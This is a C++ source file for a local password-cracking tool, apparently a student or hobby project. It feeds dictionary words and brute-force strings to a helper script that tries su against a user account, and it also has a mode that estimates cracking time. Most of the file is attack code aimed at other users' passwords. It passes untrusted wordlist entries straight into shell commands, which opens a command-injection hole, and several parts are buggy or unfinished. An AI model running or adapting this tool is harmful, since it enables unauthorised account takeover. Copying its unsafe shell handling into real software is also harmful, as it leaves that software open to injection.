#include <iostream>
#include <fstream>
#include <string>
#include <unordered_map>
#include <vector>
#include <cmath>
#include <unistd.h>

using namespace std;

int MAX_VALID_ASCII = 126;
int MIN_VALID_ASCII = 33;
int MAX_PROC = 0; //will hold the number of processes we can have at once
string USERNAME = "Bob"; //"" for root

unordered_map <string, int> HT;
vector <string> pwds;

long string_to_int(string s){
	long sum = 0;
	for(int i = 0; i <= s.length()-1; i++){
		sum += (s[i]-MIN_VALID_ASCII)*pow(MAX_VALID_ASCII-MIN_VALID_ASCII,s.length()-i-1);
	}
	return sum;
} 

string int_to_string(long l){
	string s = "";
	for(int i = 1; (long(pow(93,i))) < l; i++){
		s+=char(int(l%(long(pow(93,i)))+33));
		l=l-l%(long(pow(93,i)));
	}
	reverse(s.begin(), s.end());
	return s;
}

int main(int argc, char **argv){
    pwds.push_back(""); //Just in case user has no password

    

    //Ideally, print an error message if user fails to run program correctly 
    cout << "Usage: ./a.out passwords.txt <optional: password>" << endl;

    //Figure out how many procs we can have at once
    //this gets the total number of processes we can have as the user
    //do we care about the total number of processes or procs?
    system("nproc >> process.txt");
    ifstream process_file;
    process_file.open("process.txt");
    process_file >> MAX_PROC;
    printf("%d is the max proc\n", MAX_PROC);



    //Initialize Dictionary 
    ifstream pwd_file;
    pwd_file.open("argv[1]");
    if(!pwd_file.is_open()){
    	cout << "Invalid file\n";
    	return(1);
    }
	string pwd;
    int num = 1;
    while (pwd_file >> pwd) {
            HT[pwd] = num;        //use HT[pwd] to get index
            pwds.push_back(pwd);  //use pwds[index] to get pwd
            num++;
    }
    int DICT_SIZE = num;
	//load entire dictionary in an array and seperately in a hash table
	// HashTable HT;
	// if (HT.isEmpty()) {
	// 	cout << "Empty Hash!" << endl;
	// } else {
	// 	cout << "Not Empty!" << endl;
	// }
	// string pwd;
	// int num = 0;
	// while (cin >> pwd) {
	// 	HT.insertItem(num, pwd);
	// 	num++;
    // }
	
    // Print Entire Dictionary
    // HT.printTable();


	//PASSWORD ANALYSIS MODE:
	//If password is in dictionary, do math to tell user how long it would take 
	//If not, do math to tell user how long it would take to dial up to their password
    if(argc==3){
    	cout << "Analysis Mode: \n";
    	int time = 0;
    	if(HT[argv[1]] != 0){
    		time = HT[argv[1]] * 3 / MAX_PROC;
    	}else time = (string_to_int(argv[1]) + DICT_SIZE) * 3 / MAX_PROC;
    	cout << "It would take " << time << " seconds to crack your password.\n";
    	return(0);
    }




	//PASSWORD CRACKING MODE:
    system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
    for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
        const string cmd = "bash suprobe.sh " + pwds[i] +' '+ USERNAME + to_string(getpid()) + " >/dev/null 2>/dev/null &";
        system(cmd.c_str());
        //TODO: if(cracked) stop;
    }
    //If we make it this far, password was not in dict;
    pwd = "";
    pwd+=char(33);
    //while(!cracked){
    	//Test Password 
    	const string cmd = "bash suprobe.sh " + pwd +' '+ USERNAME + to_string(getpid()) + ">/dev/null 2>/dev/null &";
        system(cmd.c_str());
        //Increment String
        pwd=int_to_string(string_to_int(pwd)+1);
    //}


    return 0;
}
